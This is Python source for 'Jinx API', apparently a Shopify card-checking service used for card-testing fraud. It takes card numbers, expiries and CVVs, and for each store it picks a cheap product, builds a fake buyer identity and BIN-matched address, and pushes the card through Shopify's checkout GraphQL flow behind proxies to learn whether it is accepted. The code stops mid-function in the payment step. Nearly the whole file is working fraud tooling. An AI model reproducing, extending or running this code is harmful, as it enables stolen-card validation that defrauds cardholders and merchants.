#!/usr/bin/env python3
"""
Jinx API — ULTRA PRO Shopify Card Checker (v4.0)
==================================================
Full async + Kitaro GraphQL workflow + bot.py compatible

Response format: {"Response": "...", "Price": "...", "Gateway": "..."}
Endpoint: GET /Shopify?site=<url>&cc=<cc|mm|yyyy|cvv>&proxy=<optional>
"""

import sys, os, re, json, time, random, threading, secrets, sqlite3
import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ============================================================
# BRAND
# ============================================================
BRAND = "Jinx"
VERSION = "4.0.0"
DB_PATH = "jinx_api_keys.db"

# ============================================================
# CONFIG
# ============================================================
PRICE_MIN = 0.50
PRICE_MAX = 25.00
MAX_RETRIES = 3
SOFT_ERRORS = {
    "WAITING_PENDING_TERMS",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "PENDING_TERMS",
    "PROCESSING",
}

# ============================================================
# BIN → COUNTRY
# ============================================================
BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "currency": "USD"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M5",
           "zoneCode": "ON", "countryCode": "CA", "phone": "+14165551234",
           "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "+442079460123",
           "currency": "GBP"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210",
           "currency": "INR"},
    "AE": {"address1": "Burj Khalifa", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971501234567",
           "currency": "AED"},
    "HK": {"address1": "Nathan Road 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+85255555555",
           "currency": "HKD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8002",
           "zoneCode": "ZH", "countryCode": "CH", "phone": "+4144512345",
           "currency": "CHF"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "+61291234567",
           "currency": "AUD"},
    "MX": {"address1": "Av Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "currency": "MXN"},
    "BR": {"address1": "Av Paulista 1578", "city": "Sao Paulo", "postalCode": "01310200",
           "zoneCode": "SP", "countryCode": "BR", "phone": "+5511999999999",
           "currency": "BRL"},
    "DE": {"address1": "Friedrichstrasse 100", "city": "Berlin", "postalCode": "10117",
           "zoneCode": "BE", "countryCode": "DE", "phone": "+4930123456",
           "currency": "EUR"},
    "JP": {"address1": "1-1 Chiyoda", "city": "Tokyo", "postalCode": "1008111",
           "zoneCode": "TK", "countryCode": "JP", "phone": "+81312345678",
           "currency": "JPY"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "currency": "USD"},
}

# ============================================================
# BIN LOOKUP (async safe + cached)
# ============================================================
_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    if not HAS_REQUESTS:
        return "US"
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            country = (data.get("country_code") or
                       data.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = country
            return country
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def pick_address(country_code):
    return BOOK.get((country_code or "US").upper(), BOOK["DEFAULT"])


# ============================================================
# PROXY PARSER
# ============================================================
SOCKS5_PORTS = {1080, 1081, 1082, 1083, 1084, 1085, 4145, 9050, 9150}
SOCKS4_PORTS = {4146}


def parse_proxy_string(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None
    hint = None
    m = re.search(r'\s*\(\s*([A-Za-z0-9]+)\s*\)\s*$', p)
    if m:
        hint = m.group(1).upper()
        p = p[:m.start()].strip()
    if p.startswith("socks5://") or p.startswith("socks5h://"):
        return ("socks5", p.replace("socks5h://", "socks5://"))
    if p.startswith("socks4://"):
        return ("socks4", p)
    if p.startswith("http://") or p.startswith("https://"):
        return ("http", p)
    if "@" in p:
        scheme = (hint or "http").lower()
        if scheme not in ("http", "socks4", "socks5"):
            scheme = "http"
        return (scheme, f"{scheme}://{p}")
    parts = p.split(":")
    if len(parts) == 4:
        ip, port_s, user, pw = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5": scheme = "socks5"
        elif hint == "SOCKS4": scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"): scheme = "http"
        elif port in SOCKS5_PORTS: scheme = "socks5"
        elif port in SOCKS4_PORTS: scheme = "socks4"
        else: scheme = "http"
        return (scheme, f"{scheme}://{user}:{pw}@{ip}:{port}")
    if len(parts) == 2:
        ip, port_s = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5": scheme = "socks5"
        elif hint == "SOCKS4": scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"): scheme = "http"
        elif port in SOCKS5_PORTS: scheme = "socks5"
        elif port in SOCKS4_PORTS: scheme = "socks4"
        else: scheme = "http"
        return (scheme, f"{scheme}://{ip}:{port}")
    return None


def build_proxy_url(proxy_str):
    parsed = parse_proxy_string(proxy_str)
    if not parsed:
        return None, None
    scheme, url = parsed
    if scheme in ("socks4", "socks5") and not HAS_SOCKS:
        return None, "no_socks"
    return url, scheme


# ============================================================
# HELPERS
# ============================================================
def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    for pattern in [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
    ]:
        for match in re.findall(pattern, message, re.IGNORECASE):
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 60:
                return match.strip("{}:'\" ")
    words = message.split()
    if words:
        fw = words[0]
        if "_" in fw and fw.isupper():
            return fw
    return message[:60]


# ============================================================
# ASYNC SHOPIFY CHECKER
# ============================================================
FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David",
               "Mary", "Patricia", "Jennifer", "Linda", "Ahmed", "Mohamed",
               "Fatima", "Sarah", "Omar", "Layla", "Youssef", "Hannah"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
              "Miller", "Davis", "Rodriguez", "Khalil", "Chen", "Singh",
              "Nguyen", "Wong", "Kumar", "Ahmed"]


class ShopifyAsync:
    """Async Shopify checker — full Kitaro workflow."""

    def __init__(self, domain, proxy_url=None, proxy_scheme=None):
        self.domain = domain if domain.startswith("http") else f"https://{domain}"
        self.domain = self.domain.rstrip("/")
        self.proxy_url = proxy_url
        self.proxy_scheme = proxy_scheme
        self.session = None
        self.country_code = "US"
        self.address = BOOK["DEFAULT"]
        self.currency = "USD"
        self.user_info = None
        self.product = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.merchandise_id = None
        self.payment_identifier = None
        self.payment_session_id = None
        self.checkpoint_data = None
        self.attempt_token = None
        self.checkout_url = None
        self.subtotal = "0.00"
        self.shipping_amount = 0.0
        self.tax_amount = 0.0
        self.running_total = "0.00"
        self.gateway = "Shopify"
        self.user_agent = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ])

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=60)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def _req(self, method, url, **kw):
        for attempt in range(2):
            try:
                return await self.session.request(
                    method, url, proxy=self.proxy_url, **kw
                )
            except Exception:
                if attempt == 0:
                    continue
                return None

    def set_card_country(self, cc_number):
        self.country_code = lookup_bin_country(cc_number[:6])
        self.address = pick_address(self.country_code)
        self.currency = self.address.get("currency", "USD")

    def get_user_info(self):
        if self.user_info:
            return self.user_info
        fn = random.choice(FIRST_NAMES)
        ln = random.choice(LAST_NAMES)
        email = f"{fn.lower()}.{ln.lower()}{random.randint(1, 999)}@gmail.com"
        self.user_info = {
            "fname": fn, "lname": ln, "email": email,
            "phone": self.address["phone"],
            "add": self.address["address1"],
            "city": self.address["city"],
            "state_short": self.address["zoneCode"],
            "zip": self.address["postalCode"],
        }
        return self.user_info

    async def get_products(self):
        if self.product:
            return self.product
        r = await self._req("GET", f"{self.domain}/products.json",
                            headers={"Accept": "application/json"})
        if not r or r.status != 200:
            return None
        try:
            data = await r.json()
        except Exception:
            return None
        products = data.get("products", [])
        if not products:
            return None
        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        valid = []
        for p in products:
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", 999)).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({
                        "title": p["title"],
                        "handle": p["handle"],
                        "variant_id": v["id"],
                        "price": price,
                    })
        if not valid:
            return None
        valid.sort(key=lambda x: x["price"])
        # Mid-range to avoid minimum order
        idx = min(len(valid) // 2, len(valid) - 1)
        self.product = valid[idx]
        return self.product

    async def visit_product(self):
        p = await self.get_products()
        if not p:
            return False
        r = await self._req("GET", f"{self.domain}/products/{p['handle']}",
                            headers={"Accept": "text/html,*/*;q=0.8",
                                     "Referer": f"{self.domain}/"})
        return r is not None

    async def add_to_cart(self):
        p = await self.get_products()
        if not p:
            return False
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{self.domain}/",
        }
        await self._req("GET", f"{self.domain}/cart.js", headers=headers)
        r = await self._req("POST", f"{self.domain}/cart/add.js", headers=headers,
                            data=f"id={p['variant_id']}&quantity=1&form_type=product")
        if not r or r.status != 200:
            h2 = {**headers, "Content-Type": "application/json"}
            r = await self._req("POST", f"{self.domain}/cart/add.js", headers=h2,
                                json={"items": [{"id": int(p["variant_id"]), "quantity": 1}]})
        return r is not None and r.status == 200

    async def init_checkout(self):
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": self.domain, "Referer": f"{self.domain}/cart",
            "Upgrade-Insecure-Requests": "1",
        }
        await self._req("GET", f"{self.domain}/checkout", headers=headers)
        r = await self._req("POST", f"{self.domain}/cart", headers=headers,
                            data={"checkout": "", "updates[]": "1"},
                            allow_redirects=True)
        if not r:
            return False
        text = await r.text()
        final_url = str(r.url)
        self.checkout_url = final_url

        sst = r.headers.get("X-Checkout-One-Session-Token") or \
              r.headers.get("x-checkout-one-session-token")
        if not sst:
            for pat in [
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                r'"serializedSessionToken":"([^"]+)"',
                r'"sessionToken":"([^"]+)"',
                r'data-session-token="([^"]+)"',
            ]:
                m = re.search(pat, text)
                if m:
                    sst = m.group(1)
                    break
        self.session_token = sst

        m = re.search(r'/checkouts/cn/([^/?]+)', final_url)
        self.attempt_token = m.group(1) if m else final_url.split('/')[-1].split('?')[0]

        unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
        self.queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or \
                           extract_between(unescaped, '"queueToken":"', '"')
        self.stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or \
                         extract_between(unescaped, '"stableId":"', '"')

        merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                extract_between(unescaped, 'ProductVariantMerchandise/', '"')
        p = await self.get_products()
        self.merchandise_id = merch or str(p["variant_id"]) if p else merch

        cur = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or \
              extract_between(unescaped, '"currencyCode":"', '"')
        if cur:
            self.currency = cur

        sub = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
              extract_between(unescaped, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
        if not sub:
            m2 = re.search(r'"price":\s*"([\d.]+)"', text)
            sub = m2.group(1) if m2 else "0.01"
        self.subtotal = sub

        return bool(self.session_token)

    async def create_payment_session(self, cc, mon, year, cvv):
        ui = self.get_user_info()
        if len(str(year)) == 2:
            year = "20" + str(year)
        endpoints = [
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://checkout.shopifycs.com/sessions",
        ]
        for ep in endpoints:
            try:
                headers = {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Origin": "https://checkout.pci.shopifyinc.com",
                    "Referer": "https://checkout.pci.shopifyinc.com/",
                    "User-Agent": self.user_agent,
                }
                payload = {
                    "credit_card": {
                        "number": str(cc).replace(" ", ""),
                        "month": int(mon),
                        "year": int(year),
                        "verification_value": str(cvv),
                        "name": f"{ui['fname']} {ui['lname']}",
                    },
                    "payment_session_scope": urlparse(self.domain).netloc,
                }
                async with self.session.post(ep, headers=headers, json=payload,
                                             proxy=self.proxy_url) as r:
                    if r.status == 200:
                        j = await r.json()
                        if "id" in j:
                            self.payment_session_id = j["id"]
                            return self.payment_session_id
            except Exception:
                continue
        return None

    def _gql_headers(self):
        return {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": self.domain,
            "Referer": f"{self.domain}/",
            "User-Agent": self.user_agent,
            "X-Checkout-One-Session-Token": self.session_token or "",
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": f'id="{self.attempt_token}", type="cn"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

    async def _submit_graphql(self, query, variables, operation):
        url = f"{self.domain}/checkouts/unstable/graphql"
        headers = self._gql_headers()
        payload = {"query": query, "variables": variables, "operationName": operation}
        return await self._req("POST", url, headers=headers, json=payload)

    # ─────────────────────────────────────────────────────
    # STEP 1: Proposal (Shipping)
    # ─────────────────────────────────────────────────────
    async def proposal_shipping(self):
        ui = self.get_user_info()
        p = await self.get_products()
        query = (
            "query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,"
            "$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,"
            "$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,"
            "$discounts:DiscountTermsInput,$taxes:TaxTermInput){"
            "session(sessionInput:$sessionInput){negotiate(input:{"
            "purchaseProposal:{delivery:$delivery,merchandise:$merchandise,"
            "payment:$payment,buyerIdentity:$buyerIdentity,discounts:$discounts,"
            "taxes:$taxes},queueToken:$queueToken}){__typename result{"
            "...on NegotiationResultAvailable{checkpointData queueToken "
            "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename} "
            "delivery{...on FilledDeliveryTerms{deliveryLines{"
            "availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}}"
            "payment{...on FilledPaymentTerms{availablePaymentLines{"
            "paymentMethod{name paymentMethodIdentifier __typename}__typename}__typename}}"
            "tax{...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}}"
            "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}"
            "...on Throttled{pollAfter queueToken __typename}__typename}__typename}}"
        )
        variables = {
            "sessionInput": {"sessionToken": self.session_token},
            "queueToken": self.queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": {
                        "address1": ui["add"], "address2": "",
                        "city": ui["city"], "countryCode": self.country_code,
                        "postalCode": ui["zip"], "firstName": ui["fname"],
                        "lastName": ui["lname"], "zoneCode": ui["state_short"],
                        "phone": ui["phone"]
                    }},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id or "1",
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                        "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                    }},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {
                        "amount": self.subtotal, "currencyCode": self.currency
                    }},
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": {
                    "address1": "", "city": "",
                    "countryCode": self.country_code,
                    "lastName": "", "zoneCode": ui["state_short"], "phone": ""
                }}
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": self.currency,
                    "countryCode": self.country_code
                },
                "email": ui["email"], "emailChanged": False,
                "phoneCountryCode": self.country_code,
                "marketingConsent": [{"email": {"value": ui["email"]}}],
                "shopPayOptInPhone": {"countryCode": self.country_code},
                "rememberMe": False
            },
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": self.currency}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            }
        }
        r = await self._submit_graphql(query, variables, "Proposal")
        if not r:
            return {"status": "failed", "reason": "proposal_request_failed"}
        text = await r.text()

        if "CAPTCHA_REQUIRED" in text:
            return {"status": "rejected", "code": "CAPTCHA_REQUIRED"}
        if "CheckpointDenied" in text:
            return {"status": "rejected", "code": "CHECKPOINT_DENIED"}
        if "Throttled" in text:
            return {"status": "retry", "reason": "throttled"}

        try:
            data = json.loads(text)
        except Exception:
            return {"status": "failed", "reason": "invalid_json_proposal"}

        if "errors" in data:
            msgs = [e.get("message", "") for e in data["errors"][:2]]
            return {"status": "rejected", "code": extract_clean_response(msgs[0]) if msgs else "GRAPHQL_ERROR"}

        try:
            negotiate = data["data"]["session"]["negotiate"]
            result = negotiate["result"]
            if result.get("__typename") == "CheckpointDenied":
                return {"status": "rejected", "code": "CHECKPOINT_DENIED"}

            self.checkpoint_data = result.get("checkpointData")
            seller = result["sellerProposal"]
            self.running_total = seller["runningTotal"]["value"]["amount"]

            # Shipping rate
            delivery = seller.get("delivery", {})
            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", [])
                if dl and dl[0].get("availableDeliveryStrategies"):
                    s = dl[0]["availableDeliveryStrategies"][0]
                    self.shipping_handle = s.get("handle", "")
                    try:
                        self.shipping_amount = float(s["amount"]["value"]["amount"])
                    except Exception:
                        self.shipping_amount = 0.0

            # Tax
            tax = seller.get("tax", {})
            if tax.get("__typename") == "FilledTaxTerms":
                try:
                    self.tax_amount = float(tax["totalTaxAmount"]["value"]["amount"])
                except Exception:
                    self.tax_amount = 0.0

            # Payment method
            payment = seller.get("payment", {})
            if payment.get("__typename") == "FilledPaymentTerms":
                for pl in payment.get("availablePaymentLines", []):
                    pm = pl.get("paymentMethod", {})
                    ident = pm.get("paymentMethodIdentifier")
                    if ident:
                        self.payment_identifier = ident
                        self.gateway = pm.get("name", "Shopify")
                        break

            if not self.payment_identifier:
                return {"status": "failed", "reason": "no_payment_method"}

            return {"status": "ok"}
        except Exception as e:
            return {"status": "failed", "reason": f"proposal_parse: {e}"}

    # ─────────────────────────────────────────────────────
    # STEP 2: Proposal (Delivery + Billing)
    # ─────────────────────────────────────────────────────
    async def proposal_delivery(self):
        ui = self.get_user_info()
        p = await self.get_products()
        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": self.country_code, "postalCode": ui["zip"],
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"]
        }
        query = (
            "query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,"
            "$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,"
            "$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,"
            "$discounts:DiscountTermsInput,$taxes:TaxTermInput){"
            "session(sessionInput:$sessionInput){negotiate(input:{"
            "purchaseProposal:{delivery:$delivery,merchandise:$merchandise,"
            "payment:$payment,buyerIdentity:$buyerIdentity,discounts:$discounts,"
            "taxes:$taxes},queueToken:$queueToken}){__typename result{"
            "...on NegotiationResultAvailable{checkpointData queueToken "
            "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
            "payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}"
            "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}__typename}__typename}}"
        )
        variables = {
            "sessionInput": {"sessionToken": self.session_token},
            "queueToken": self.queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"streetAddress": addr},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": getattr(self, "shipping_handle", "") or "",
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id or "1"}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {
                        "amount": str(self.shipping_amount), "currencyCode": self.currency
                    }},
                    "destinationChanged": False
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id or "1",
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                        "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                    }},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {
                        "amount": self.subtotal, "currencyCode": self.currency
                    }},
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": addr}
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": self.currency,
                    "countryCode": self.country_code
                },
                "email": ui["email"], "emailChanged": False,
                "phoneCountryCode": self.country_code,
                "marketingConsent": [{"email": {"value": ui["email"]}}],
                "shopPayOptInPhone": {"countryCode": self.country_code},
                "rememberMe": False
            },
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {
                    "amount": str(self.tax_amount), "currencyCode": self.currency
                }},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            }
        }
        r = await self._submit_graphql(query, variables, "Proposal")
        if not r:
            return {"status": "failed", "reason": "delivery_request_failed"}
        text = await r.text()
        if "CAPTCHA_REQUIRED" in text:
            return {"status": "rejected", "code": "CAPTCHA_REQUIRED"}
        try:
            data = json.loads(text)
            result = data["data"]["session"]["negotiate"]["result"]
            self.checkpoint_data = result.get("checkpointData") or self.checkpoint_data
            return {"status": "ok"}
        except Exception:
            return {"status": "ok"}  # non-critical

    # ─────────────────────────────────────────────────────
    # STEP 3: Submit Payment
    # ─────────────────────────────────────────────────────
    async def submit_payment(self, cc, mon, year, cvv):
        ui = self.get_user_info()
        p = await self.get_products()

        # Payment session (tokenize card)
        token = await self.create_payment_session(cc, mon, year, cvv)
        if not token:
            return {"status": "failed", "reason": "payment_session_failed"}

        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": self.country_code, "postalCode": ui["zip"],
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"]
        }

        query = (
            "mutation SubmitForCompletion($input:NegotiationInput!,"
            "$attemptToken:String!,$metafields:[MetafieldInput!],"
            "$analytics:AnalyticsInput){submitForCompletion(input:$input "
            "attemptToken:$attemptToken metafields:$metafields analytics:$analytics){"
            "...on SubmitSuccess{receipt{id __typename}__typename}"
            "...on SubmitAlreadyAccepted{receipt{id __typename}__typename}"
            "...on SubmitFailed{reason __typename}"
            "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
            "...on Throttled{pollAfter queueToken __typename}"
            "...on CheckpointDenied{redirectUrl __typename}"
            "...on SubmittedForCompletion{receipt{id __typename}__typename}__typename}}"
        )
        variables = {
            "input": {
                "sessionInput": {"sessionToken": self.session_token},
                "queueToken": self.queue_token or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"streetAddress": addr},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": getattr(self, "shipping_handle", "") or "",
                                "customDeliveryRate": False
                            },
                            "options": {"phone": ui["phone"]}
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id or "1"}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"value": {
                            "amount": str(self.shipping_amount), "currencyCode": self.currency
                        }},
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                            "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {
                            "amount": self.subtotal, "currencyCode": self.currency
                        }},
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {"directPaymentMethod": {
                            "paymentMethodIdentifier": self.payment_identifier,
                            "sessionId": token,
                            "billingAddress": {"streetAddress": addr},
                            "cardSource": None
                        }},
                        "amount": {"value": {
                            "amount": self.running_total, "currencyCode": self.currency
                        }},
                        "dueAt": None
                    }],
                    "billingAddress": {"streetAddress": addr}
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": self.currency,
                        "countryCode": self.country_code
                    },
                    "email": ui["email"], "emailChanged": False,
                    "phoneCountryCode": self.country_code,
                    "marketingConsent": [{"email": {"value": ui["email"]}}],
                    "shopPayOptInPhone": {"number": ui["phone"], "countryCode": self.country_code},
                    "rememberMe": False
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {
                        "amount": str(self.tax_amount), "currencyCode": self.currency
                    }},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "optionalDuties": {"buyerRefusesDuties": False}
            },
            "attemptToken": self.attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": self.checkout_url or f"{self.domain}/"}
        }
        if self.checkpoint_data:
            variables["input"]["checkpointData"] = self.checkpoint_data

        r = await self._submit_graphql(query, variables, "SubmitForCompletion")
        if not r:
            return {"status": "failed", "reason": "submit_request_failed"}
        text = await r.text()

        if "CAPTCHA_REQUIRED" in text:
            return {"status": "rejected", "code": "CAPTCHA_REQUIRED"}
        if "Your order total has changed" in text:
            return {"status": "failed", "reason": "ORDER_TOTAL_CHANGED"}
        if "payment method is not available" in text:
            return {"status": "failed", "reason": "PAYMENT_METHOD_UNAVAILABLE"}

        try:
            data = json.loads(text)
        except Exception:
            return {"status": "failed", "reason": "submit_invalid_json"}

        submit = data.get("data", {}).get("submitForCompletion", {})
        if not submit:
            errors = data.get("errors", [])
            for e in errors:
                if e.get("code"):
                    return {"status": "rejected", "code": e["code"]}
            return {"status": "failed", "reason": "empty_submit"}

        tn = submit.get("__typename", "")

